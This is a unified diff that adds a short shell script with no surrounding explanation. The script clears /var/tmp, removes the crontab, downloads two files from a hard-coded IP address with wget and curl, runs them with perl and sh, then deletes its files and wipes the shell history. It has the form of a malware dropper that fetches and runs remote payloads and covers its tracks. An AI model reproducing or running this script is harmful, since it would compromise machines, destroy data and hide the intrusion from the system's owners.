@@ -1,0 +1,12 @@
+#!/bin/sh
+cd /var/tmp
+rm -rf .* *
+crontab -r
+wget http://14.142.118.25/f.txt
+curl -O http://14.142.118.25/f.txt
+perl f.txt
+wget -q http://14.142.118.25/w.sh
+curl -O http://14.142.118.25/w.sh
+chmod a+x w.sh && sh w.sh
+rm -rf * f* .*
+history -rc
